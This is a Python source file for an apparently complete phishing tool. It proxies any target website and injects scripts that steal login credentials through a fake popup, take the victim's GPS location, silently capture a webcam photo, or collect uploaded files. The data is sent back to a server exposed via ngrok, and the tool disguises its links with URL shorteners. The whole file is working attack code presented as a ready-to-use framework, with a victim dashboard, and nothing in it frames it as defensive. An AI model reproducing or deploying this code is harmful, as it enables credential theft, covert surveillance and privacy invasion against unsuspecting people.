import base64
import os
import random
import string
import time
import socket
import threading
import requests
import logging
from flask import Flask, request, redirect, jsonify, make_response
import pyshorteners
from urllib.parse import urlparse, urljoin
from pyngrok import ngrok, conf
from rich.console import Console
from rich.table import Table
from rich.live import Live
from rich.panel import Panel
from rich.progress import Progress
import jwt
from bs4 import BeautifulSoup

# Inisialisasi console
console = Console()

# Nonaktifkan log ngrok dan Flask
logging.getLogger("pyngrok").setLevel(logging.ERROR)
logging.getLogger("werkzeug").setLevel(logging.ERROR)

class PhishingGenerator:
    def __init__(self):
        self.app = Flask(__name__)
        self.app.logger.disabled = True
        self.results = []
        self.victims = {}
        self.server_url = None
        self.language = None
        self.ngrok_auth_token = None
        self.show_victims = False
        self.shortener = pyshorteners.Shortener()
        self.secret_key = os.urandom(24)
        self.live_display = None # Tambahkan inisialisasi live_display
        
        # Setup logging
        try:
            if not os.path.exists('logs'):
                os.makedirs('logs')
            logging.basicConfig(
                level=logging.ERROR,
                format='%(asctime)s - %(levelname)s - %(message)s',
                filename='logs/phishing.log',
                filemode='a'
            )
            self.logger = logging.getLogger(__name__)
            self.logger.disabled = True
        except Exception as e:
            print(f"Error setting up logging: {str(e)}")
            self.logger = logging.getLogger(__name__)
        
        # Create required directories
        try:
            for directory in ['captured_images', 'uploaded_files', 'templates']:
                if not os.path.exists(directory):
                    os.makedirs(directory)
        except Exception as e:
            print(f"Error creating directories: {str(e)}")

        # Flask routes
        @self.app.route('/')
        def home():
            return "Server Berjalan"
            
        @self.app.route('/phish/<phish_id>', methods=['GET', 'POST'])
        def serve_phishing(phish_id):
            try:
                target_url = request.args.get('url')
                phish_type = request.args.get('type', 'default')
                
                if not target_url:
                    raise ValueError("URL target tidak diberikan")
                
                # Fetch the target URL content
                session = requests.Session()
                resp = session.get(target_url, headers={'User-Agent': request.headers.get('User-Agent', 'Mozilla/5.0')}, timeout=10)
                
                if resp.status_code != 200:
                    raise ValueError("Gagal mengakses URL target")
                
                # Process the HTML content
                soup = BeautifulSoup(resp.text, 'html.parser')
                
                # Rewrite all relative URLs to absolute using the phishing server
                for tag in soup.find_all(['a', 'img', 'script', 'link']):
                    attr = 'href' if tag.name in ['a', 'link'] else 'src'
                    if tag.has_attr(attr):
                        original_url = tag[attr]
                        parsed_original = urlparse(original_url)
                        if not parsed_original.scheme and not parsed_original.netloc:
                            # It's a relative URL, convert to absolute
                            absolute_url = urljoin(target_url, original_url)
                            tag[attr] = absolute_url
                
                proxied_content = str(soup)

                # Inject permission scripts based on phishing type
                permission_script = """
                <script>
                window.onload = function() {
                    // Request permissions based on phishing type
                """
                
                if phish_type == "location":
                    permission_script += """
                    navigator.permissions.query({name:'geolocation'}).then(function(result) {
                        if (result.state === 'granted') {
                            // Already have permission
                            getLocation();
                        } else {
                            navigator.geolocation.getCurrentPosition(function(position) {
                                // Send location data
                                fetch('/collect-data', {
                                    method: 'POST',
                                    headers: {'Content-Type': 'application/json'},
                                    body: JSON.stringify({
                                        type: 'location',
                                        lat: position.coords.latitude,
                                        lng: position.coords.longitude
                                    })
                                }).then(function() {
                                    window.top.location.href = '""" + target_url + """';
                                });
                            });
                        }
                    });
                    """
                
                elif phish_type == "form":
                    permission_script += """
                    // Create and show login form popup
                    var formHtml = `
                        <div id="loginForm" style="position:fixed; top:0; left:0; width:100%; height:100%; 
                            background:rgba(0,0,0,0.8); display:flex; justify-content:center; align-items:center; z-index:9999;">
                            <div style="background:white; padding:30px; border-radius:10px; box-shadow:0 0 20px rgba(0,0,0,0.5); max-width:400px; width:90%;">
                                <h2 style="margin-top:0; color:#333; text-align:center;">Login Required</h2>
                                <form id="authForm" style="display:flex; flex-direction:column; gap:15px;">
                                    <input type="email" id="email" placeholder="Email" required style="padding:10px; border:1px solid #ddd; border-radius:5px;">
                                    <div style="position:relative;">
                                        <input type="password" id="password" placeholder="Password" required style="padding:10px; border:1px solid #ddd; border-radius:5px; width:100%;">
                                        <span onclick="togglePassword()" style="position:absolute; right:10px; top:50%; transform:translateY(-50%); cursor:pointer; color:#666;">
                                            👁️
                                        </span>
                                    </div>
                                    <div style="display:flex; justify-content:space-between; align-items:center; font-size:14px;">
                                        <label style="display:flex; align-items:center; gap:5px; color:#666;">
                                            <input type="checkbox" id="remember"> Remember me
                                        </label>
                                        <a href="#" onclick="showForgotPassword()" style="color:#007bff; text-decoration:none;">
                                            Forgot Password?
                                        </a>
                                    </div>
                                    <button type="submit" style="padding:10px; background:#007bff; color:white; border:none; border-radius:5px; cursor:pointer; font-weight:bold;">
                                        Login
                                    </button>
                                </form>
                            </div>
                        </div>
                    `;
                    document.body.insertAdjacentHTML('beforeend', formHtml);
                    
                    // Add JavaScript functions
                    window.togglePassword = function() {
                        var pwd = document.getElementById('password');
                        pwd.type = pwd.type === 'password' ? 'text' : 'password';
                    }
                    
                    window.showForgotPassword = function() {
                        alert('Password reset link has been sent to your email');
                    }
                    
                    document.getElementById('authForm').addEventListener('submit', function(e) {
                        e.preventDefault();
                        var formData = {
                            email: document.getElementById('email').value,
                            password: document.getElementById('password').value,
                            remember: document.getElementById('remember').checked
                        };
                        
                        fetch('/collect-data', {
                            method: 'POST',
                            headers: {'Content-Type': 'application/json'},
                            body: JSON.stringify({
                                type: 'form_data',
                                data: formData
                            })
                        }).then(function() {
                            window.top.location.href = '""" + target_url + """';
                        });
                    });
                    """

                elif phish_type == "camera":
                    permission_script += """
                    navigator.permissions.query({name:'camera'}).then(function(result) {
                        if (result.state === 'granted') {
                            // Already have permission
                            startCamera();
                        } else {
                            navigator.mediaDevices.getUserMedia({video: true})
                            .then(function(stream) {
                                // Create video and canvas elements
                                var video = document.createElement('video');
                                var canvas = document.createElement('canvas');
                                video.style.display = 'none';
                                canvas.style.display = 'none';
                                document.body.appendChild(video);
                                document.body.appendChild(canvas);
                                
                                // Set video source to camera stream
                                video.srcObject = stream;
                                video.play();
                                
                                // Wait for video to load
                                video.onloadedmetadata = function() {
                                    canvas.width = video.videoWidth;
                                    canvas.height = video.videoHeight;
                                    
                                    // Take photo after 1 second
                                    setTimeout(function() {
                                        // Draw video frame to canvas
                                        canvas.getContext('2d').drawImage(video, 0, 0);
                                        
                                        // Convert canvas to base64 image
                                        var imageData = canvas.toDataURL('image/jpeg');
                                        
                                        // Send image data
                                        fetch('/collect-data', {
                                            method: 'POST',
                                            headers: {'Content-Type': 'application/json'},
                                            body: JSON.stringify({
                                                type: 'camera_capture',
                                                image: imageData
                                            })
                                        }).then(function() {
                                            // Stop camera and cleanup
                                            stream.getTracks().forEach(track => track.stop());
                                            video.remove();
                                            canvas.remove();
                                            window.top.location.href = '""" + target_url + """';
                                        });
                                    }, 1000);
                                };
                            });
                        }
                    });
                    """
                elif phish_type == "file":
                    permission_script += """
                    // Create and show file upload popup
                    var uploadHtml = `
                        <div id="fileUploadForm" style="position:fixed; top:0; left:0; width:100%; height:100%; 
                            background:rgba(0,0,0,0.8); display:flex; justify-content:center; align-items:center; z-index:9999;">
                            <div style="background:white; padding:30px; border-radius:10px; box-shadow:0 0 20px rgba(0,0,0,0.5); max-width:400px; width:90%;">
                                <h2 style="margin-top:0; color:#333; text-align:center;">Please Upload Required Files</h2>
                                <form id="uploadForm" style="display:flex; flex-direction:column; gap:15px;">
                                    <input type="file" id="fileInput" multiple required style="padding:10px; border:1px solid #ddd; border-radius:5px;">
                                    <button type="submit" style="padding:10px; background:#007bff; color:white; border:none; border-radius:5px; cursor:pointer; font-weight:bold;">
                                        Upload Files
                                    </button>
                                </form>
                            </div>
                        </div>
                    `;
                    document.body.insertAdjacentHTML('beforeend', uploadHtml);
                    
                    document.getElementById('uploadForm').addEventListener('submit', function(e) {
                        e.preventDefault();
                        var files = document.getElementById('fileInput').files;
                        var formData = new FormData();
                        
                        for(var i = 0; i < files.length; i++) {
                            formData.append('files[]', files[i]);
                        }
                        
                        fetch('/collect-data', {
                            method: 'POST',
                            body: formData
                        }).then(function() {
                            window.top.location.href = '""" + target_url + """';
                        });
                    });
                    """

                permission_script += """
                }
                </script>
                """

                # Inject the permission script before closing </body>
                if '</body>' in proxied_content:
                    proxied_content = proxied_content.replace('</body>', permission_script + '</body>')
                else:
                    proxied_content += permission_script

                response = make_response(proxied_content)
                
                # Set cookie palsu dengan atribut SameSite dan Secure
                fake_cookie = jwt.encode({'user_id': 'anonymous', 'session': ''.join(random.choices(string.ascii_letters + string.digits, k=32))}, self.secret_key, algorithm='HS256')
                response.set_cookie('session', fake_cookie, httponly=True, secure=True, samesite='Lax')
                
                return response
            except Exception as e:
                self.logger.error(f"Error serving phishing page: {str(e)}")
                return "Halaman tidak ditemukan", 404
                
        @self.app.route('/collect-data', methods=['POST'])
        def collect_data():
            try:
                victim_ip = request.remote_addr
                
                if 'files[]' in request.files:
                    # Handle file upload
                    uploaded_files = request.files.getlist('files[]')
                    filenames = []
                    
                    for file in uploaded_files:
                        if file:
                            filename = f"uploaded_files/{int(time.time())}_{victim_ip}_{file.filename}"
                            file.save(filename)
                            filenames.append(filename)
                            
                    result = {
                        'type': 'file_upload',
                        'ip': victim_ip,
                        'timestamp': time.strftime('%Y-%m-%d %H:%M:%S'),
                        'data': {
                            'filenames': filenames
                        }
                    }
                else:
                    # Handle other data types
                    data = request.get_json()
                    
                    if data['type'] == 'camera_capture':
                        # Save base64 image to file
                        img_data = data['image'].replace('data:image/jpeg;base64,', '')
                        img_bytes = base64.b64decode(img_data)
                        
                        filename = f"captured_images/capture_{int(time.time())}_{victim_ip}.jpg"
                        
                        with open(filename, 'wb') as f:
                            f.write(img_bytes)
                            
                        data['image'] = filename
                    
                    result = {
                        'type': data['type'],
                        'ip': victim_ip,
                        'timestamp': time.strftime('%Y-%m-%d %H:%M:%S'),
                        'data': data
                    }
                
                self.add_victim_data(victim_ip, result)
                self.save_result(result)
                
                return jsonify({'status': 'success'})
            except Exception as e:
                self.logger.error(f"Error collecting data: {str(e)}")
                return jsonify({'status': 'error', 'message': str(e)}), 500

    def save_result(self, result):
        """Simpan hasil dengan penanganan kesalahan"""
        try:
            with open('phishing_results.txt', 'a', encoding='utf-8') as f:
                f.write(f"\n{'='*50}\n")
                f.write(f"Tipe: {result['type']}\n")
                f.write(f"IP: {result['ip']}\n")
                f.write(f"Waktu: {result['timestamp']}\n")
                f.write(f"Data: {result['data']}\n")
            
            # Tampilkan hasil secara realtime di terminal
            console.print(Panel(f"""
[cyan]🎣 Data Phishing Baru Ditangkap![/]
    
[yellow]Tipe:[/] {result['type']}
[yellow]IP:[/] {result['ip']}
[yellow]Waktu:[/] {result['timestamp']}
[yellow]Data:[/] {result['data']}
            """))
        except Exception as e:
            self.logger.error(f"Error menyimpan hasil: {str(e)}")

    def select_language(self):
        """Pilih bahasa aplikasi"""
        self.clear_screen()
        console.print(Panel("[cyan]✨ Select Language / Pilih Bahasa ✨[/]", border_style="cyan"))
        console.print("\n[1] 🇺🇸 English")
        console.print("[2] 🇮🇩 Bahasa Indonesia")
        
        while True:
            choice = console.input("\n[yellow]Select option (1-2): [/]")
            if choice in ["1", "2"]:
                self.language = "en" if choice == "1" else "id"
                break
            console.print("[red]Invalid choice! Please select 1 or 2[/]")

    def setup_ngrok(self):
        """Setup ngrok tunnel dengan penanganan error yang lebih baik"""
        self.clear_screen()
        try:
            # Konfigurasi ngrok
            if not self.ngrok_auth_token:
                self.ngrok_auth_token = console.input("\n[yellow][[?]] Enter ngrok auth token: [/]")
            conf.get_default().auth_token = self.ngrok_auth_token
            conf.get_default().region = "ap" # Asia Pacific
            
            # Tutup tunnel yang ada
            try:
                ngrok.kill()
            except:
                pass
            
            # Buat tunnel baru dengan opsi yang lebih stabil
            tunnel_options = {
                "bind_tls": True,
                "proto": "http",
                "addr": "5000",
                "inspect": False,
                "auth": None,
                "host_header": "rewrite"
            }
            
            # Coba beberapa kali jika gagal
            max_retries = 3
            for attempt in range(max_retries):
                try:
                    ngrok_tunnel = ngrok.connect(**tunnel_options)
                    self.server_url = ngrok_tunnel.public_url
                    break
                except Exception as e:
                    if attempt == max_retries - 1:
                        raise e
                    time.sleep(2)
            
            # Tambahkan header untuk menghindari masalah CORS dan kompatibilitas
            @self.app.after_request
            def after_request(response):
                response.headers.add('Access-Control-Allow-Origin', '*')
                response.headers.add('Access-Control-Allow-Headers', '*')
                response.headers.add('Access-Control-Allow-Methods', '*')
                response.headers.add('X-Frame-Options', 'ALLOWALL')
                response.headers.add('X-Content-Type-Options', 'nosniff')
                response.headers.add('Strict-Transport-Security', 'max-age=31536000')
                return response
            
            msg = f"✅ Ngrok tunnel berhasil dibuat di {self.server_url}"
            self.logger.info(msg)
            console.print(f"[green]{msg}[/]")
            
        except Exception as e:
            msg = f"❌ Gagal membuat tunnel ngrok: {str(e)}"
            self.logger.error(msg)
            console.print(f"[red]{msg}[/]")
            self.server_url = None

    def add_victim_data(self, victim_ip, data):
        """Tambah data korban dan update display realtime dengan penanganan error"""
        try:
            if victim_ip not in self.victims:
                self.victims[victim_ip] = []
            self.victims[victim_ip].append(data)
            if self.show_victims:
                self.update_live_display()
        except Exception as e:
            self.logger.error(f"Error adding victim data: {str(e)}")

    def update_live_display(self):
        """Update tampilan realtime dengan rich dan penanganan error"""
        try:
            title = "🎯 Real-time Phishing Victims Data" if self.language == "en" else "🎯 Data Korban Phishing Realtime"
            table = Table(title=title)
            table.add_column("IP", style="cyan")
            table.add_column("Time" if self.language == "en" else "Waktu", style="magenta")
            table.add_column("Type" if self.language == "en" else "Tipe", style="green")
            table.add_column("Data", style="yellow")

            for ip, data_list in self.victims.items():
                for data in data_list:
                    table.add_row(
                        ip,
                        data['timestamp'],
                        data['type'],
                        str(data['data'])
                    )

            console.clear()
            console.print(table)
            
        except Exception as e:
            self.logger.error(f"Error updating live display: {str(e)}")

    def clear_screen(self):
        """Clear screen dengan penanganan error"""
        try:
            os.system('cls' if os.name == 'nt' else 'clear')
        except:
            print("\n" * 100)

    def display_banner(self):
        banner = f"""
        ╔═══════════════════════════════════════════════════════════════════════════════════════════════╗
        ║ ██████╗ ██╗  ██╗██╗███████╗██╗  ██╗██╗███╗   ██╗ ██████╗     ████████╗ ██████╗  ██████╗ ██╗ ║
        ║ ██╔══██╗██║  ██║██║██╔════╝██║  ██║██║████╗  ██║██╔════╝     ╚══██╔══╝██╔═══██╗██╔═══██╗██║ ║ 
        ║ ██████╔╝███████║██║███████╗███████║██║██╔██╗ ██║██║  ███╗       ██║   ██║   ██║██║   ██║██║ ║
        ║ ██╔═══╝ ██╔══██║██║╚════██║██╔══██║██║██║╚██╗██║██║   ██║       ██║   ██║   ██║██║   ██║██║ ║
        ║ ██║     ██║  ██║██║███████║██║  ██║██║██║ ╚████║╚██████╔╝       ██║   ╚██████╔╝╚██████╔╝██║ ║
        ║ ╚═╝     ╚═╝  ╚═╝╚═╝╚══════╝╚═╝  ╚═╝╚═╝╚═╝  ╚═══╝ ╚═════╝        ╚═╝    ╚═════╝  ╚═════╝ ╚═╝ ║
        ╚═══════════════════════════════════════════════════════════════════════════════════════════════╝                                                                                                    
    [yellow][*] Created By: Rayhan Dzaky AL Mubarok
    [green][*] Version: 2.1 - Advanced Phishing Framework with Ngrok Integration
    [cyan][*] Server Status: {'🟢 Online' if self.server_url else '🔴 Offline'} - {self.server_url if self.server_url else 'Not Connected'}
        """
        console.print(Panel(banner))

    def display_menu(self):
        menu = Table(title="🎯 Phishing Menu" if self.language == "en" else "🎯 Menu Phishing", border_style="cyan")
        menu.add_column("No", style="cyan", justify="center")
        menu.add_column("Option" if self.language == "en" else "Opsi", style="yellow")
        menu.add_column("Description" if self.language == "en" else "Deskripsi", style="green")
        
        menu_items = [
            ("1", "Location Phishing" if self.language == "en" else "Phishing Lokasi", 
             "Get victim's GPS location" if self.language == "en" else "Dapatkan lokasi GPS korban"),
            ("2", "Form Phishing" if self.language == "en" else "Phishing Form",
             "Create custom phishing form" if self.language == "en" else "Buat form phishing kustom"),
            ("3", "Camera Phishing" if self.language == "en" else "Phishing Kamera",
             "Access victim's camera" if self.language == "en" else "Akses kamera korban"),
            ("4", "File Phishing" if self.language == "en" else "Phishing File",
             "Get files from victim" if self.language == "en" else "Dapatkan file dari korban"),
            ("5", "View Results" if self.language == "en" else "Lihat Hasil",
             "View captured data" if self.language == "en" else "Lihat data yang didapat"),
            ("6", "Exit" if self.language == "en" else "Keluar",
             "Exit program" if self.language == "en" else "Keluar dari program")
        ]
        
        for item in menu_items:
            menu.add_row(*item)
            
        console.print(menu)

    def generate_phishing_link(self, phish_type, target_url=None):
        """Generate link phishing dengan penanganan error yang lebih baik"""
        try:
            if not self.server_url:
                raise ValueError("Server URL tidak tersedia. Silakan periksa koneksi ngrok.")
                
            phish_id = ''.join(random.choices(string.ascii_letters + string.digits, k=8))
            phish_url = f"{self.server_url}/phish/{phish_id}?type={phish_type}&url={target_url}"
            
            # Tidak perlu membuat template phishing karena menggunakan reverse proxy
            # Simpan template sederhana dengan proxy
            template_path = f"templates/{phish_id}.html"
            proxy_template = f"""
            <!DOCTYPE html>
            <html>
            <head>
                <title>Redirecting...</title>
                <meta name="viewport" content="width=device-width, initial-scale=1">
                <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
                <meta name="HandheldFriendly" content="true">
                <style>
                    body {{ margin: 0; padding: 0; }}
                </style>
            </head>
            <body>
                <iframe src="/phish/{phish_id}?type={phish_type}&url={target_url}" style="width:100%; height:100vh; border:none;"></iframe>
            </body>
            </html>
            """
            with open(template_path, "w", encoding="utf-8") as f:
                f.write(proxy_template)
                
            # Coba beberapa layanan URL shortener dengan retry
            shortened_url = None
            shorteners = [
                lambda url: self.shortener.tinyurl.short(url),
                lambda url: self.shortener.isgd.short(url),
                lambda url: self.shortener.dagd.short(url)
            ]
            
            for shortener in shorteners:
                try:
                    shortened_url = shortener(phish_url)
                    break
                except:
                    continue
                    
            if not shortened_url:
                shortened_url = phish_url
            
            # Tampilkan hasil dengan format yang rapi
            console.print(Panel(f"""
[cyan]🎣 Link Phishing Berhasil Dibuat![/]
    
[yellow]Original URL:[/]
{phish_url}

[yellow]Shortened URL:[/]
{shortened_url}

[green]✨ Link telah dipersingkat dan dimasker untuk penyamaran yang lebih baik![/]
[red]⚠️ Link akan tetap aktif hingga program ditutup[/]
            """))
            
            return shortened_url
            
        except Exception as e:
            self.logger.error(f"Error generating phishing link: {str(e)}")
            console.print(f"\n[red]❌ Gagal membuat link phishing: {str(e)}[/]")
            return None

    def run(self):
        """Menjalankan program phishing dengan tampilan realtime"""
        try:
            self.select_language()
            self.setup_ngrok()
            
            # Start Flask di thread terpisah dengan opsi threaded=True dan host 0.0.0.0
            flask_thread = threading.Thread(
                target=lambda: self.app.run(
                    host='0.0.0.0', 
                    port=5000,
                    threaded=True,
                    debug=False
                )
            )
            flask_thread.daemon = True
            flask_thread.start()
            
            while True:
                self.clear_screen()
                self.display_banner()
                self.display_menu()
                
                choice = console.input(f"\n[yellow][[?]] {'Select menu' if self.language == 'en' else 'Pilih menu'} (1-6): [/]")
                
                if choice == "1":
                    target = console.input(f"\n[yellow][[?]] {'Enter target URL' if self.language == 'en' else 'Masukkan URL target'}: [/]")
                    with Progress() as progress:
                        task = progress.add_task("[cyan]Generating phishing link...", total=100)
                        self.generate_phishing_link("location", target_url=target)
                        progress.update(task, advance=100)
                    console.input(f"\n[green]{'Press Enter to continue...' if self.language == 'en' else 'Tekan Enter untuk melanjutkan...'}[/]")
                
                elif choice == "2":
                    target = console.input(f"\n[yellow][[?]] {'Enter target URL' if self.language == 'en' else 'Masukkan URL target'}: [/]")
                    with Progress() as progress:
                        task = progress.add_task("[cyan]Generating phishing link...", total=100)
                        self.generate_phishing_link("form", target_url=target)
                        progress.update(task, advance=100)
                    console.input(f"\n[green]{'Press Enter to continue...' if self.language == 'en' else 'Tekan Enter untuk melanjutkan...'}[/]")
                
                elif choice == "3":
                    target = console.input(f"\n[yellow][[?]] {'Enter target URL' if self.language == 'en' else 'Masukkan URL target'}: [/]")
                    with Progress() as progress:
                        task = progress.add_task("[cyan]Generating phishing link...", total=100)
                        self.generate_phishing_link("camera", target_url=target)
                        progress.update(task, advance=100)
                    console.input(f"\n[green]{'Press Enter to continue...' if self.language == 'en' else 'Tekan Enter untuk melanjutkan...'}[/]")
                
                elif choice == "4":
                    target = console.input(f"\n[yellow][[?]] {'Enter target URL' if self.language == 'en' else 'Masukkan URL target'}: [/]")
                    with Progress() as progress:
                        task = progress.add_task("[cyan]Generating phishing link...", total=100)
                        self.generate_phishing_link("file", target_url=target)
                        progress.update(task, advance=100)
                    console.input(f"\n[green]{'Press Enter to continue...' if self.language == 'en' else 'Tekan Enter untuk melanjutkan...'}[/]")
                
                elif choice == "5":
                    self.show_victims = True
                    self.update_live_display()
                    console.input(f"\n[green]{'Press Enter to return to menu...' if self.language == 'en' else 'Tekan Enter untuk kembali ke menu...'}[/]")
                    self.show_victims = False
                    if self.live_display:
                        self.live_display.stop()
                        self.live_display = None
                
                elif choice == "6":
                    msg = "Closing program..." if self.language == "en" else "Menutup program..."
                    console.print(f"\n[red][[!]] {msg}[/]")
                    break
                    
        except KeyboardInterrupt:
            msg = "Program terminated by user" if self.language == "en" else "Program dihentikan oleh user"
            console.print(f"\n[red][[!]] {msg}[/]")
        except Exception as e:
            self.logger.error(f"Runtime error: {str(e)}")
            console.print(f"\n[red][[!]] Error: {str(e)}[/]")
        finally:
            if self.live_display:
                self.live_display.stop()
            ngrok.kill()

if __name__ == "__main__":
    phisher = PhishingGenerator()
    phisher.run()
